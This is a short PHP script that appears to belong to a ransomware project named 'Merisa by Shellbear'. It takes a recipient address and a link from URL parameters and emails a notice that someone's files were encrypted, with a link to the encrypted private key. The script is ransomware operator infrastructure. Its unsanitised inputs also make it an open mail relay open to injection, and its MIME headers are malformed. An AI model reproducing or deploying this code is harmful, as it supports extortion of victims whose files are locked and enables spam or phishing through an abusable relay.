<?php

$passage_ligne = "\r\n";


$boundary = "-----=".md5(rand());

$to      = $_GET['to'];
$subject = 'Merisa';
$message_html = '<html><head></head><body style="background-color:#202020;"><br><br><center><h1 style="font-family:Courier;color:#FFFFFF">Merisa by Shellbear</h1><br><p style="font-family:Courier;color:#DCDCDC">Hello, you received this mail because someone had all his files encrypted.</p><p style="font-family:Courier;color:#DCDCDC">You will see at the bottom of this email the link of the encrypted private key which is the only way to decrypt the files.</p><br><br><p style="font-family:Courier;color:#DCDCDC">In order to decrypt the key, just copy and paste URL in the Merisa script.</p></center></body></html>';
$message_html .= '<br><br><center><a style="font-family:Courier;color:#FFFFFF" href="';
$message_html .= $_GET['message'];
$message_html .= '">Link to Key</a></center>';
$headers = 'From: Merisa by Shellbear' . "\r\n" .
    'Reply-To: Merisa by Shellbear' . "\r\n" .
    'MIME-Version: 1.0' . "\r\n" .
    'Content-Type: multipart/alternative;".$passage_ligne.' . "\r\n" . 
    'X-Mailer: PHP/' . phpversion();

$message = $passage_ligne."--".$boundary.$passage_ligne;
$message .= "Content-Type: text/html; charset=\"ISO-8859-1\"".$passage_ligne;
$message.= "Content-Transfer-Encoding: 8bit".$passage_ligne;
$message.= $passage_ligne.$message_html.$passage_ligne;
$message.= $passage_ligne."--".$boundary."--".$passage_ligne;
$message.= $passage_ligne."--".$boundary."--".$passage_ligne;

mail($to, $subject, $message, $headers);
?>